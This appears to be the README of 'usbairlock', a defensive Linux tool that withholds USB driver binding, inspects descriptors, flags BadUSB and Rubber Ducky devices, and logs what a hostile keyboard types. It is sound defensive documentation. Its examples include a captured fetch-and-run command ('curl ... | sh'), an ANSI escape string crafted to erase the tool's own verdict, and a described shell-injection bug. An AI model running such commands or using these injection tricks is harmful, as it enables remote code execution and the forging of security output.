# usbairlock

*it shows you things... horrible things*

Read what a USB device claims before the kernel binds a driver to it, and record what it
does if it turns out to be the sort of device that does things.

An airlock is a chamber you pass through before the thing you are entering. A device
enumerates, its descriptors are read, its claims are judged, and only then does anything
get to bind.

This is a bench workflow with that gate at the front. `usbairlock` decides whether a
device binds; `tools/` handles what comes after, once something has been let through and
the question turns from whether to trust it into what it actually is. Only the first half
makes a security claim.

```sh
sudo ./usbairlock --auto        # the usual run: withhold, inspect, record what types
sudo ./usbairlock --auto -q     # same, trusting and hiding what is already plugged in
./usbairlock --observe          # watch only, change nothing, no root
sudo ./usbairlock --paranoid    # every protection on
./usbairlock --status           # what is withheld right now
./usbairlock --list             # the device tree, with real addresses
sudo ./usbairlock --verbose ADDR  # every descriptor of one device, decoded
```

Run it in a spare terminal and plug something in. Arrivals print with their descriptors,
their claimed interfaces and any suspect claims, before a driver touches them.

For a HID device it goes one level further and reads the **report descriptor** -- the
device's own declaration of what it can send -- over endpoint 0, on an interface no
driver is allowed to bind. So the question stops being *does it claim to be a keyboard*
and becomes *what has it declared it can do*:

```
[HIGH] declares keyboard AND consumer control, vendor-defined channel
       its own report descriptor says it can type and press media keys and open an
       arbitrary channel. A keyboard has no reason to.
```

Every kernel change is reversed on exit, including Ctrl-C, SIGTERM and SIGHUP.

![usbairlock holding two devices and recording what a keyboard typed](docs/usbairlock.png)

A real `--paranoid --auto` run. Both devices are held `UNAUTHORIZED`, so the kernel
created no interface objects and nothing could bind, yet the descriptors below each one
were still read over control transfers: manufacturer, product, serial, and every
interface the device claims. The keyboard scores `HIGH` on a boot-protocol claim, and the
last two lines are what it typed, read straight off the endpoint. None of it reached the
session.

## what it does that blocking alone does not

A device that claims to be a keyboard can be refused. That tells you it is hostile. It does
not tell you what it was going to do.

`--auto` claims the interface through usbfs instead, so the reports are read directly from
the endpoint and never become input events. The device types its payload into a log while
the machine sits inert:

```
+ ARRIVED  1a2c:2d23  USB Keyboard
           UNBOUND  interfaces present, no driver attached
           if0 class 0x03 HID  sub=1 proto=1
           [HIGH] claims a boot-protocol KEYBOARD
           capturing  reports read directly from the endpoint
  TYPED    1a2c:2d23  hello world<ENTER>
```

Inter-keystroke timing is printed with chords, which is its own tell: a person types
80 to 200 ms apart, an automated payload fires at 5 to 20 ms.

## protections

Each is independent, settable in config or by flag (`--unbind-hid`, `--no-withhold-interface`).

| protection | default | what it does |
| --- | --- | --- |
| `withhold_interface` | **on** | device configures normally, but **no interface binds a driver** |
| `withhold_device` | off | device is held entirely unauthorized. Blunter, see the note |
| `unbind_hid` | off | unbinds and refuses `usbhid`, so a claimed keyboard cannot type |
| `unbind_storage` | off | refuses `usb-storage` autoprobe |
| `unbind_net` | off | refuses USB ethernet and RNDIS, which can hijack DNS and routes |
| `unbind_serial` | off | refuses `cdc_acm`, `ftdi_sio`, `ch341`, `cp210x`, `pl2303`, `option`, so no tty appears for an unknown device |
| `usbfs_snoop` | off | raw USB traffic into the kernel ring buffer. Very loud |

**`withhold_interface` is the default because it is better on both counts** (kernel 4.13+).
Authorization per interface rather than per device means a composite gadget is not
all-or-nothing: you can accept the CDC serial interface of a board while refusing the HID
keyboard interface it also claims. That is precisely the shape of a BadUSB serial adapter,
and device-level gating can only say yes or no to the whole thing.

**Why `withhold_device` is off by default:** it is blunter. A device held entirely
unauthorized exposes no interfaces at all, so nothing can inspect them and `--auto` cannot
capture anything. `withhold_interface` leaves the device configured and readable while still
letting no driver bind. Turn the device gate on with `--withhold-device` or `--paranoid`
when you want both.

**A correction, kept because it was wrong in an instructive way.** `withhold_interface` was
also chosen on a guess that it would avoid the re-enumeration loop cheap HID firmware
falls into. It does not. Observed on a plain USB keyboard with the device authorized and
only its interfaces held: it still reset itself every few seconds, `devnum` climbing each
time and invalidating any `/dev/bus/usb/...` path. The loop comes from nothing claiming
the interface, not from the device being unauthorized. That is why `capture_forever`
re-resolves and reclaims rather than treating a disconnect as fatal.

## hubs, and what a withheld one hides

`--list` renders the tree, because a flat list of a dock is unreadable:

```
usb1
  1-4      05e3:0610  hub   0   [HUB] GenesysLogic USB2.0 Hub
           opaque  withheld hub: nothing behind it can enumerate, so this
                   listing cannot show what is
```

A withheld hub binds no driver, so **nothing behind it enumerates at all**. Its devices
do not show up as unreachable, they do not show up in any form: the kernel never created
them. That is worth stating plainly on the hub, because otherwise you plug in a dock
holding two devices and watch both silently vanish.

It also means an unauthorized hub is an opaque surface rather than a known quantity, and
a hostile device can present as one.

## addressing a device

`vid:pid` is a **model** identifier, not a device identifier. Plug in two identical
keyboards and it names both, which is the shape a hostile device most wants: one that
looks exactly like something already trusted. So every flag that takes a device also
takes a real address.

```sh
./usbairlock --list                  # every device, every address
./usbairlock --list --porcelain      # tab-separated, one record per device
```

```
addr           bus/dev   id           ifcls   driver      auth  name
usb1           001/001   1d6b:0002    09      hub         1     [HUB] xHCI Host Controller
└ 1-1          001/091   1a2c:2d23    03      usbhid      1     USB USB Keyboard
└ 1-2          001/089   303a:1001    02,0a   none        0     Espressif USB JTAG
└ 1-4          001/012   05e3:0608    09      hub         0     [HUB] USB2.0 Hub
    └ 1-4.1    001/013   1a2c:2d23    03      none        1     USB USB Keyboard
               unreachable behind unauthorized hub 1-4, nothing below it can enumerate
```

The tree comes free: sysfs encodes the whole topology in the name. `1-2.3` is port 3 of
the hub on port 2 of root hub `usb1`, so parentage needs no lookups.

It is worth drawing because **an unauthorized hub silently strands everything beneath
it**. The device is enumerated, reports `authorized=1`, and cannot be reached, and
nothing anywhere says why. That is the "I allowed it and nothing happened" case, and it
is also what a hostile hub with a keyboard behind it looks like.

Root hubs are listed rather than hidden: they are where the gates are actually written,
so a listing that drops them hides what `--status` changes.

## logging

```sh
sudo ./usbairlock --auto --log /var/log/usbairlock.jsonl
```

Appends the event stream as newline-delimited JSON, the **same wire format the viewer
socket carries**, so a log replays through anything that reads a viewer. One format, two
sinks.

```json
{"ev":"session","t":1755..,"protections":["withhold_interface","unbind_hid"],"argv":"--auto --log ..."}
{"ev":"present","addr":"1-1","id":"1a2c:2d23","worst":"HIGH","authorized":"1","drivers":"usbhid"}
{"ev":"log","t":1755..,"line":"11:29:16  TYPED   1a2c:2d23  curl -s http://x.sh | sh"}
```

Three decisions worth knowing. The file is **0600**, because it records what a device
typed and a world-readable copy of captured keystrokes is a worse outcome than no log.
Colour is stripped, since escape codes in a forensic artifact are noise and break every
line-oriented tool. And it is **flushed per line**, because the interesting case is a
machine that got yanked, where the buffered last line is the one worth having.

The startup baseline is logged in full, including devices `--quiet` hides. A log filtered
by display preference is not a record of what was attached, and the baseline is the half
you cannot reconstruct afterwards.

Read one back with `--replay`, which is the viewer's renderer pointed at a file instead of
a socket:

```sh
./usbairlock --replay /var/log/usbairlock.jsonl
./usbairlock --replay /var/log/usbairlock.jsonl --porcelain   # passthrough for scripts
```

Exit status is 2 if anything in the record scored HIGH, so an old session greps the same
way a live one does. A truncated final line is skipped rather than fatal, because a
monitor that got killed is exactly when a log matters and a half-written line is what
that leaves behind.

## releasing a device you decided to trust

`--authorize` on a device the monitor is capturing stops the capture and rebinds its
drivers, so the device starts working immediately:

```sh
sudo ./usbairlock --authorize 1a2c:2d23
```

The monitor prints `+ allowed` and then `released`, and every viewer sees both. Before
this, allowing a captured device only exempted a future replug: the capture kept the
interface claimed through usbfs and kept usbhid detached, so the device was admitted on
paper and still dead in your hand.

## reading a log

`--replay` needs to read the journal, and `--log` writes it 0600 owned by whoever ran the
monitor, which is root. So replaying a log usually needs `sudo`:

```sh
sudo ./usbairlock --replay /tmp/triage.jsonl
```

## what a device declares it can send

A class code is a claim about category: *I am a HID*. The **report descriptor** is a
claim about capability: *and these are the reports I will produce*. That difference is
the BadUSB question, and it is the difference between these two verdicts:

```
[MED]  claims a raw HID interface
       no boot protocol, so intent is opaque without its report descriptor

[HIGH] declares keyboard AND consumer control, vendor-defined channel
       its own report descriptor says it can type and press media keys and open an
       arbitrary channel. A keyboard has no reason to.
```

The descriptor is fetched with a standard `GET_DESCRIPTOR` on endpoint 0 -- no driver
and no interface claim -- so **it can be read from a device this tool is holding**, with
`usbhid` detached and nothing bound. Full declared capability, zero ability to act. The
kernel returns `EBUSY` for a control transfer aimed at an interface a driver owns, so
this only runs where it can succeed: HID class, not boot protocol, no driver bound.

A benign descriptor still gets reported rather than passed over in silence:

```
[LOW]  report descriptor declares consumer, telephony
       read directly from the device; no keyboard and no vendor-defined channel
```

That is a real dock's audio HID -- volume, transport keys, and a telephony hook switch.
"Nothing to report" and "I did not look" must not read alike.

The parser is deliberately partial: usage pages and Input items, no field layout and no
logical ranges. It never raises on malformed input, because a hostile device is exactly
the thing that sends a truncated descriptor, and reporting nothing would hand it the
outcome it wanted -- a descriptor that will not decode is itself flagged.

## what is knowable before anything binds

Everything below is populated by the kernel at enumeration, so it is all readable from a
device the gate is holding -- before a driver exists for it.

```
usb=2.01  speed=480  power=500mA  configs=1  authorized=1  bus-powered  rev=8179
port: internal, soldered to this machine
```

| field | what it tells you |
| --- | --- |
| `rev=` | `bcdDevice`, the device revision. Clones and relabelled parts often differ here from the genuine article even when VID:PID matches |
| `bus-powered` / `self-powered` | `bmAttributes`. A **claim**, and hubs lie about it: one asserting self-powered with no supply makes the kernel allow a full load per port, and the devices behind it brown out with nothing logged |
| `port:` | `removable` from firmware. `internal, soldered` means no human plugged it in -- that is your built-in webcam, not something that arrived |
| `kernel quirks` | the kernel has named workarounds registered against this exact hardware. Decoded to the names in `include/linux/usb/quirks.h` |
| `slow link` | a USB 3 device that negotiated below SuperSpeed: a 2.0 cable, a 2.0 port, or a 2.0 hub in the chain |
| `ep3 IN` | endpoint addresses and direction, per interface |

The link note is deliberately narrow. Almost every device running below its declared
version is doing so on purpose -- a Bluetooth adapter declaring USB 2.01 and running at
12 Mb/s has no use for High Speed. Flagging that would bury the one case that means
something.

## --verbose: every byte, decoded

```sh
sudo ./usbairlock --verbose 1-5
```

```
  1-5  0bda:5538  Integrated_Webcam_HD
  ------------------------------------------------------------------
  device
      usb              2.01  High Speed (480 Mb/s)
      class            0xef  misc
      revision         8179
      port             internal, soldered to this machine
      physical         upper left top panel (not used)
      kernel quirks    none
      drivers bound    uvcvideo

  configuration 1  2 interfaces, 500mA, bus-powered
      association: interfaces 0+2 act as one function (class 0x0e)
      if0 alt0  0x0e video   sub=1 proto=0  1 endpoint
          ep3 IN int  32B  every 6 frames
          + class-specific endpoint, 7x class-specific interface
      if1 alt1  0x0e video   sub=2 proto=0  1 endpoint
          ep1 IN iso  128B  every 1 frame
      if1 alt3  0x0e video   sub=2 proto=0  1 endpoint
          ep1 IN iso  1024B  every 1 frame

  778/778 bytes in 46 descriptors, all accounted for
```

`lsusb -v` prints the same bytes. What this adds:

- **the last line.** Every descriptor is length-prefixed, so it is possible to prove
  nothing was skipped. Tools that print only what they recognise cannot tell you what
  they ignored.
- **alternate settings as themselves.** Those `if1 alt1` / `alt3` lines with different
  packet sizes are a webcam's bandwidth tiers for different resolutions.
- **interface associations**, which is what makes a webcam's control and streaming
  interfaces one logical device rather than two unrelated ones.
- **the HID report descriptor decoded**, not dumped as hex.
- **what only the kernel knows**: physical port from ACPI, whether the port is
  user-accessible at all, registered kernel quirks, live driver bindings.
- class-specific descriptors counted and named rather than printed raw.

## reading a HID device on its own terms

The report descriptor is normally read as part of a verdict, but "what reports does this
thing actually produce" is the first question when working out how to talk to a game
controller, a foot pedal or a barcode scanner -- and it has nothing to do with trust.

```
$ sudo ./usbairlock --hid 1-4.4.1

  1-4.4.1  HID report descriptors
  ------------------------------------------------------------------
  if3  62 bytes
      declares  consumer, telephony
      pages     telephony, consumer
      05 0c 09 01 a1 01 15 00 25 01 09 e9 09 ea 09 b5 09 b6 75 01 ...
```

Raw bytes included, because anyone reverse engineering one wants them.

The interface must have **no driver bound** -- the kernel returns `EBUSY` for a control
transfer aimed at an interface a driver owns, and the tool says which driver is holding
it rather than failing vaguely. Running a monitor with `--paranoid` in another terminal
puts the device in exactly the state this needs.

## the guarantees

Five properties the tool has to hold, and what enforces each. They are grouped because
they are one argument: a device you do not trust must not be able to act, to lie about
itself, or to leave your machine worse than it found it.

### the keystroke cannot escape

To read an interface through usbfs you have to authorize it, and authorizing it also
makes it eligible for `usbhid`. Detaching the driver afterwards only shortens that
window -- a key held down across a re-enumeration can still reach your session through
it.

So the driver gate is shut before the authorization gate opens. `prepare()` suspends
bus-wide driver auto-binding first:

```
/sys/bus/usb/drivers_autoprobe -> 0
   authorize device, authorize interface, claim via usbfs
/sys/bus/usb/drivers_autoprobe -> restored
```

With auto-binding off, authorizing an interface creates something usbfs can claim and
nothing the kernel will bind a driver to, so no input device is ever made. The switch
goes straight back afterwards, because it only affects the probe that runs when an
interface is *registered* -- restoring it does not retroactively bind anything.

Not `modprobe -r usbhid`: that is global and would take out the operator's own keyboard.

### what "reversible" has to mean

Every protection is released on exit, and for the driver ones that means the driver is
**rebound**, not merely stopped being blocked:

```
cdc_ether: released; r8152: rebound 1 interface(s)
usb-storage: rebound 1 interface(s)

restored 8 kernel setting(s).
```

This matters more than it sounds. Restoring the gate is not enough on its own: an unbind
is not a saved sysfs value, so nothing replays it. A device left driverless looks
completely healthy in `lsusb` while having no `/dev/sdX`, no network interface and no
tty -- the same lockout this tool exists to prevent, arriving through the other door.

The rebind count is printed rather than assumed, because a restore that silently did not
happen reads exactly like one that did.

### the device does not get to write on your terminal

`iProduct`, `iManufacturer`, `iSerial` and `iInterface` are chosen by the device. This
tool prints them, logs them, and emits them as tab-separated porcelain. Raw, that is a
way for a device to edit the report about itself:

```
product = "Mouse\x1b[2A\x1b[2K  [SAFE] nothing suspicious here"
```

`\x1b[2A\x1b[2K` moves the cursor up two lines and erases them -- which is exactly
where `[HIGH] claims a boot-protocol KEYBOARD` was printed a moment earlier. A newline
forges an extra record in line-oriented output; a tab breaks a porcelain field.

Device text is sanitized where it is **read**, so there is no second place to forget,
and stripped bytes are replaced with `?` rather than dropped -- you should be able to
see that a device tried. `--replay` sanitizes too: a log is a file, and it can come from
another machine or from someone who would like it rendered on your terminal.

### the helper tools take argv too

`tools/identify` and `tools/dump` are what you run *after* deciding you do not trust a
device, so they get the same treatment. `dump` had the worst version of the bug in this
repo: the chip name is parsed out of the **device's own response** to `flash-id` and was
interpolated into the `read-flash` command with `shell=True`. A device answering with a
crafted chip name got its text into a shell command run against the machine it had just
been plugged into.

Both now build argv lists, a device-supplied name is reduced to a filename component
before it is used, and a port has to look like a real tty node and exist rather than
merely start with `/dev/`.

### running as root

The monitor needs root to write the sysfs gates, so everything it does with an argument
you typed has to be safe at that privilege. Arguments are passed to subprocesses as an
argv list, never through a shell, and a `VID:PID` is validated before it is used rather
than trusted.

This is not theoretical tidiness: a tool you point at hardware you distrust, running as
root, must not have a path from an argument to a shell. `tests/test_injection.py`
enforces it -- it parses the source and asserts that exactly one place may pass a
variable to a shell, the documented wrapper whose callers only hand it fixed strings.

## the word "authorized" means three things

Worth knowing before reading any log line that uses it:

| where | means |
| --- | --- |
| `1-1/authorized` | the kernel will create interface objects for this device |
| `1-1:1.0/authorized` | this interface can be claimed, or bound by a driver |
| `--authorize` | add to this tool's allow list, and do both of the above |

The kernel overloads the first two by scope and usbairlock adds a third. So a capture
does not say "authorized 1-1:1.0" any more, it says **made claimable** -- because at
that moment `usbhid` has already been detached and nothing can bind. Authorizing an
interface with no matching driver present creates something usbfs can claim and nothing
that can type at you.

That ordering is the whole trick, and it is a guarantee rather than a race: the driver
is gone before the gate opens, so there is nothing to lose a race to.

## exit status

| status | meaning |
| --- | --- |
| 0 | nothing scored HIGH |
| 1 | the command could not run: no such device, needs root, file unreadable |
| 2 | something scored HIGH |

This holds for `--inspect`, `--replay` and the live monitor alike, so a session drops into
a script without parsing anything:

```sh
sudo ./usbairlock --auto --log /tmp/triage.jsonl || echo "something claimed HIGH"
```

The monitor only ever exits through a signal handler, and that path calls `os._exit`,
which discards whatever the code would otherwise have returned. The verdict is recorded
when the device arrives rather than computed on the way out.

## machine-readable output

`--porcelain` works on every one-shot mode, not just the monitor: tab-separated records,
stable field order, no colour and no layout. The pretty output is free to change, this is
not.

**Every** line is a record -- the startup banner, arrivals, departures, serial nodes
appearing and going, and the exit line. Nothing is prose, so a consumer never has to skip
lines, and live state tracked from the stream stays correct across unplugs.

Every device-identifying record carries `addr`, because two devices of the same model are
otherwise indistinguishable. `tests/test_porcelain.py` asserts both properties, and that
no record kind is ever emitted with two different field sets.

```
$ ./usbairlock --inspect --porcelain
present	addr=1-1	id=1a2c:2d23	name=USB Keyboard	authorized=1	drivers=usbhid	worst=HIGH
threat	addr=1-1	id=1a2c:2d23	level=HIGH	claim=claims a boot-protocol KEYBOARD

$ ./usbairlock --status --porcelain
gate	root=usb1	authorized_default=0	interface_authorized_default=0	withheld=1
```

Record kinds: `dev`, `gate`, `present`, `threat`, `protection`, `diag`, `kmsg`, `session`,
`log`, `arrived`, `disarm`.


| form | example | unique |
| --- | --- | --- |
| sysfs name, the bus-port chain | `1-2` | yes, stable across replug into the same port |
| bus and device number | `001/089`, `1:89` | yes, until it re-enumerates |
| usbfs node | `/dev/bus/usb/001/089` | yes, until it re-enumerates |
| vid:pid | `303a:1001` | **no**, matches every device of that model |

Any of them works anywhere a device is named:

```sh
sudo ./usbairlock --inspect 1-2
sudo ./usbairlock --capture 1-1
sudo ./usbairlock --authorize 001/089
```

`--authorize` says so out loud when a `vid:pid` matched more than one device, rather than
acting on whichever the filesystem listed first.

## the allow list, and hiding

Two separate questions, and collapsing them into one flag made the tool lie about which
was in effect.

**Allowing is policy.** A device on the allow list is trusted: not held, not captured, not
unbound. It is keyed on `vid:pid` and it persists, so a device unplugged and replugged is
still the same trusted device.

**Hiding is display**, and it keys off the allow list rather than off a snapshot taken at
startup. So something merely hidden reappears when it is replugged, because nothing ever
trusted it.

| flag | concern |
| --- | --- |
| `--allow-existing`, `-A` | policy: trust everything currently attached |
| `--allow VID:PID` | policy: trust one device, repeatable, also settable in config |
| `--hide-allowed`, `-H` | display: do not print devices on the allow list |
| `--quiet`, `-q` | both |

The default is to trust nothing and show everything.

This matters more than it sounds. On a desktop the keyboard running the command is very
often USB, and a tool that unbinds `usbhid` from everything the moment it starts takes the
operator's own keyboard away. That is a lockout, not a protection.

Related: `--auto` does not remove `usbhid` globally. It authorizes the target interface and
unbinds the driver **from that interface only**, so every other HID device keeps working,
and rebinds on exit.

The same lockout has a back door that is easy to miss. The kernel copies
`authorized_default` into a device's own `authorized` **once, at enumeration time**, so a
device plugged in mid-session is stuck at `authorized=0` and putting the gate back on exit
does not revive it. It stays dead until it is physically replugged. Anything withheld while
the gate was down is therefore re-authorized on exit, and only that: a device someone
deauthorized for their own reasons is left alone.

## the allow list persists

`--authorize` writes to `/run/usbairlock/allow`, which is how it reaches a monitor in
another terminal. `/run` is tmpfs, so that list survives every monitor restart until the
machine reboots. A later `--paranoid` run will leave those devices alone without being
asked twice, which is the point but is easy to forget:

```sh
sudo ./usbairlock --forget      # clear it
```

The monitor names the carried-over devices at startup rather than counting them, because
a bare count was the only warning that a HIGH device would not be captured this session.

`--forget` does not un-trust a device in a monitor that is already running: it holds its
allow set in memory and only ever adds. Restart the monitor to pick up a clear.

## one monitor, many terminals

Two monitors running at once would both apply protections and both register cleanup
handlers over the same sysfs knobs, so whichever exited first would restore them while
the other still believed it was holding. Nothing reported that, and it left the machine
in exactly the state the tool exists to prevent. A second monitor is now refused:

```
$ sudo ./usbairlock --auto
  a monitor is already running (pid 1836045)
  watch it:  sudo ./usbairlock --attach
  override:  --force, only if you are sure the other one is wedged
```

`--attach` opens a read-only view of the running monitor. It sees the same arrivals,
threat lines and captured keystrokes, and it touches nothing: detaching leaves the
monitor holding. `--authorize` from a third terminal admits a device and the monitor
picks it up within a tick.

```
term 1 $ sudo ./usbairlock --auto
term 2 $ sudo ./usbairlock --attach
term 3 $ sudo ./usbairlock --authorize 303a:1001
         authorized 1 device(s): 1-2
         added to the shared allow list, monitor pid 1836045 notified

term 1 + allowed  303a:1001  another process authorized this      <- both terminals
term 2 + allowed  303a:1001  another process authorized this
```

Authorizing writes sysfs, which the monitor would see anyway on its next poll. Recording
it in the shared allow list is the separate half: without that the monitor would withhold
the same device again on the next replug.

State lives in three files under `/run/usbairlock`, which is tmpfs, so all of it is
per-boot:

| file | what it is |
| --- | --- |
| `lock` | `flock` held for the monitor's lifetime, and its pid |
| `allow` | one `vid:pid` per line, re-read every tick |
| `sock` | newline-delimited JSON, one event per line |

Two things that are deliberate. **The socket is root-only, 0600 inside a 0700
directory**, because the stream replays captured HID reports: a viewer channel anyone
could open would turn this into a keylogger with a published socket. And **IPC never
breaks protection**. A read-only filesystem, a stale socket, a viewer that stops reading:
each degrades to a note and the monitor keeps holding. A viewer that stalls past a
megabyte of backlog is dropped rather than allowed to block the poll loop.

`/run` being tmpfs also draws a line worth keeping: `--authorize` means *trust this until
reboot*, while the config file means *trust this always*. Neither silently becomes the
other.

The event stream is the seam a daemon mode would grow from. It is already a versioned
line protocol rather than a private format, so a future `--daemon` and a richer client
would not need to change what the monitor emits.

## the display

Output is a normal scrolling log with a **pinned status block** at the bottom, the shape
`apt` and `docker pull` use: arrivals and removals scroll past, the summary stays put and
repaints in place.

Deliberately not a full-screen TUI. A TUI takes over the terminal, destroys your
scrollback and cannot be copied out of or piped. This keeps an ordinary terminal session
and merely refuses to let the status scroll away. Implemented with the DECSTBM scroll
region and about eighty lines in `airlock/live.py`. `--plain` turns it off, and it turns
itself off when stdout is not a terminal, so piping produces clean text with no escape
codes.

## why not udev rules

udev is userspace and runs **after** the kernel has matched and bound a driver for many
classes. A udev rule that blocks keyboards fires once a malicious keyboard has already
typed. The kernel gate at `/sys/bus/usb/devices/usbN/authorized_default` runs before bind,
which is the only point where the decision is still yours. A device held there still
enumerates, so its descriptors stay readable and inspection keeps working. It simply gets
no driver.

Persistent version, for a box whose job is triage:

```
usbcore.authorized_default=0        # kernel command line
```

## config

Defaults are built in. Drop a file to change them, and any flag still wins:

```sh
./usbairlock --write-config > ~/.config/usbairlock/config
```

Searched in order: `~/.config/usbairlock/config`, then `/etc/usbairlock.conf`.

## what it catches, and what it cannot

Read `notes/threat-model.md`. The short version: this fully covers the BadUSB and Rubber
Ducky class, because that attack has to declare itself in a descriptor before it can act
-- and since the report descriptor is read too, "declare itself" now means its stated
capability, not just the class code it hides behind.
It **cannot** see a USB killer, which finishes in microseconds with no enumeration, and it
cannot tell a charge-only cable from an empty port, because both produce the same absence
of any event. Those are physical layer and want an inline hardware tier, which is planned and not
written yet.

## two executables, on purpose

| | lines | needs | for |
| --- | --- | --- | --- |
| `airlock-min` | 154 | python3, one file | any box, no install, drop and run |
| `usbairlock` | 1300 + 2469 | python3 stdlib | the full thing: protections, capture, descriptor parsing, config |

**`airlock-min` is the whole idea in one file.** Reads sysfs directly, assesses the
claims, watches for arrivals, and optionally holds the gates. No package, no config, no
`lsusb`, no install. `scp` it onto a machine that has nothing and it works.

**`usbairlock`** adds what a workstation can afford: six independently toggleable
protections, keystroke capture, a config file, and one-shot modes.

Shared between them, and the reason the split is cheap: `airlock/rules.py` is the
analysis core, and it **imports nothing**. No filesystem, no subprocess, no OS calls,
just tables and pure functions over plain data. That is the part worth keeping portable,
because an inline RP2040 build reimplements the plumbing but transliterates those same
tables. Everything Linux-specific lives elsewhere.

## commands

| command | what it does |
| --- | --- |
| `sudo ./usbairlock` | apply protections, then watch. The main mode |
| `./usbairlock --observe` | watch only, change nothing, no root |
| `sudo ./usbairlock --paranoid` | every protection on |
| `./usbairlock --status` | what is protected right now |
| `./usbairlock --list` | the device tree with low-level addresses. `--porcelain` for scripts |
| `sudo ./usbairlock --auto --log FILE` | append the event stream as ndjson, 0600 |
| `./usbairlock --replay FILE` | render a log back. Exit 2 if anything in it scored HIGH |
| `./usbairlock --inspect [ADDR]` | one-shot: what is attached and what it claims |
| `./usbairlock --diagnose` | nothing appeared. Why not |
| `sudo ./usbairlock --verbose ADDR` | every descriptor of one device, decoded, with a byte count |
| `sudo ./usbairlock --hid ADDR` | dump the HID report descriptors: what the device declares it can send |
| `sudo ./usbairlock --arm` / `--disarm` | apply or release protections and exit, persistently |
| `sudo ./usbairlock --authorize VID:PID` | admit one device, and share that decision with a running monitor |
| `sudo ./usbairlock --attach` | read-only view of a monitor already running elsewhere |
| `sudo ./usbairlock --forget` | clear the allow list, which otherwise persists in `/run` until reboot |
| `./usbairlock --write-config` | print a config file |

Exit status is 2 when anything scored HIGH, for `--inspect`, `--replay` and the monitor
alike. See **exit status** above.

## requirements

Python 3 and a Linux kernel. That is all.

Nothing else is needed, and that is deliberate: a triage box is exactly the machine with
a minimal image and no `usbutils`.

Devices are enumerated by reading `/sys` directly, and their full structure comes from
`/sys/bus/usb/devices/*/descriptors` -- the raw descriptor bytes as the device sent them.
`lsusb` reads the same bytes and prints them as text; parsing them directly means no
subprocess, no dependency, and no losing detail in the round trip through someone else's
output format. That file is world-readable, so the whole structural view works
**unprivileged**. Root buys the protections and the HID report descriptor fetch, nothing
else.

`lsusb` remains a fallback for the case where the raw blob cannot be read at all.

`tools/identify` and `tools/dump` are the post-airlock hardware step and do want backends
(`esptool`, `picotool`, `dfu-util`, `pyocd`); each reports which are missing and how to
install them.

## tests

```sh
python3 tests/test_threats.py     # threat assessment, synthetic descriptors
python3 tests/test_ipc.py         # lock, shared allow list, viewer channel
python3 tests/test_restore.py     # what exit puts back, including the lockout regression
python3 tests/test_topology.py    # hub parentage, stranding and port order, from the sysfs name
python3 tests/test_replay.py      # --replay reads back what --log wrote
python3 tests/test_injection.py   # no shell metacharacter path from argv to root
python3 tests/test_devicetext.py  # a device cannot rewrite the verdict about itself
python3 tests/test_rebind.py      # unbinding a driver is reversible, or it is the lockout
python3 tests/test_porcelain.py   # every line is a record, and records identify a device
python3 tests/test_hidreport.py   # what a device declares it can send, from its descriptor
python3 tests/test_descriptors.py # the raw descriptor parser that replaced lsusb
python3 tests/test_release.py     # allowing a device releases it, chords, protections
```

No pytest, no dependencies. These exist because the detector had never fired on real
hardware: every device available for testing was internal and genuinely benign, so "no
suspect claims" was an unfalsified claim. Synthetic descriptors exercise the dangerous
paths, including the BadUSB and Rubber Ducky shapes, without owning either.

## after the airlock: identifying the board

Once a device is admitted the question stops being whether it is hostile and becomes what
it is. Nothing below detects threats. A board's silicon says nothing about its intent, and
`airlock/rules.py` judges claimed interface classes, never chips: a Rubber Ducky is usually some
anonymous ATtiny, and a Pico is not dangerous by virtue of being a Pico. This is ordinary
hardware triage, kept here because it is the other half of the same bench session.

One rule does carry across, and it is the gate's own rule one layer down: **do not destroy
the evidence before you have looked at it.** The airlock will not let a driver bind until
the descriptors have been read. Step 3 will not let you flash until the firmware has been
read.

### the four steps, every family, every time

1. **Enumerate.** What does the host see? USB IDs, device class, which driver bound.
2. **Identify.** What chip is it actually, from the silicon rather than the silkscreen.
3. **Dump before you write.** The vendor firmware is the only copy of whatever this thing
   does. Reflashing destroys the evidence. Read it out first, always.
4. **Then decide.** Only after the above does it earn a place on a machine that matters.

## why a separate box

A USB device announces what it is, and the host believes it. The dangerous case is not
storage, it is a device that claims to be a **keyboard** and types the moment it
enumerates. "I will just have a look at it first" does not protect you, because looking
happens after enumeration.

That is the entire reason this withholds authorization instead of filtering after the
fact. The decision has to land **before** the kernel binds a driver, because afterwards
the keyboard has already typed. See `notes/threat-model.md` for what that does and does
not cover.

## layout

    usbairlock   the app
    airlock/     rules (portable, zero imports), protections, device analysis, HID
                 report descriptor parsing, live display, and the lock / allow list /
                 viewer channel in ipc.py
    airlock-min  the whole idea in one file, for a box with nothing installed
    tools/       identify and dump: the post-airlock hardware step
    tests/       12 files: threats, ipc, restore, topology, replay, release, rebind,
                 porcelain, injection, device text, HID and raw descriptors
    notes/       the threat model
    docs/        the screenshot
    dumps/       firmware read out of boards, gitignored. They get large, and they are
                 not ours to redistribute

## family cheatsheet

| family | enumerates as | identify | dump |
| --- | --- | --- | --- |
| ESP32 S3/C3/C6 | `303a:*` native USB, or a CH340/CP2102 bridge | `esptool chip_id` | `esptool read_flash` |
| ESP8266 | CH340 / CP2102 | `esptool chip_id` | `esptool read_flash` |
| RP2040 / RP2350 | `2e8a:0003` mass storage in BOOTSEL | `picotool info -a` | `picotool save` |
| STM32 | `0483:df11` DFU, or SWD | `dfu-util -l` | `dfu-util -U` |
| AVR / Arduino | CH340 / FT232 | `avrdude -c arduino -p m328p` | `avrdude -U flash:r:` |
| nRF52 | J-Link, DAPLink | `pyocd list` | `pyocd flash --read` |
| any Cortex-M | SWD probe | `openocd` IDCODE scan | target dependent |

## the failure that is not a failure

`notes/threat-model.md` puts charge-only cables in the row this tier **cannot** catch, and
that is not a hedge: a device that never enumerates never reaches the gate, so the tool is
blind here by construction. Recognising it by hand is the only substitute.

A board that powers up, drives its screen, and produces **no USB event at all** is not
broken software. The host never saw a connect, so it is electrical: a charge-only cable,
a connector orientation, or a board whose USB-C carries power only.

Special case worth knowing: the **ESP32-C3 native USB Serial/JTAG lives on GPIO18 and
GPIO19**. Vendor firmware that repurposes those pins kills USB the instant it boots. Hold
BOOT (GPIO9), tap RESET, release BOOT to force the ROM bootloader, which reclaims them.
If the board enumerates only in that state, the firmware was stealing the pins.
